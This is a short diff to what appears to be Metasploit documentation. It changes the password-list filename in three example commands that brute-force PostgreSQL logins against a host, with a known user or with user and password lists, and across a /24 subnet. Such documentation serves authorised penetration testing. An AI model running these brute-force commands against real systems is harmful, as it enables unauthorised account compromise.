@@ -43,14 +43,14 @@ Brute-force host with known user and password list:
 
 ```
 use auxiliary/scanner/postgres/postgres_login
-run postgres://known_user@192.168.222.1 threads=50 pass_file=./rockyou.txt
+run postgres://known_user@192.168.222.1 threads=50 pass_file=./wordlist.txt
 ```
 
 Brute-force credentials:
 
 ```
 use auxiliary/scanner/postgres/postgres_login
-run postgres://192.168.222.1 threads=50 user_file=./users.txt pass_file=./rockyou.txt
+run postgres://192.168.222.1 threads=50 user_file=./users.txt pass_file=./wordlist.txt
 ```
 
 Brute-force credentials in a subnet:
@@ -58,7 +58,7 @@ Brute-force credentials in a subnet:
 ```
 use auxiliary/scanner/postgres/postgres_login
 run cidr:/24:postgres://user:pass@192.168.222.0 threads=50
-run cidr:/24:postgres://user@192.168.222.0 threads=50 pass_file=./rockyou.txt
+run cidr:/24:postgres://user@192.168.222.0 threads=50 pass_file=./wordlist.txt
 ```
 
 ### PostgreSQL Capture Server
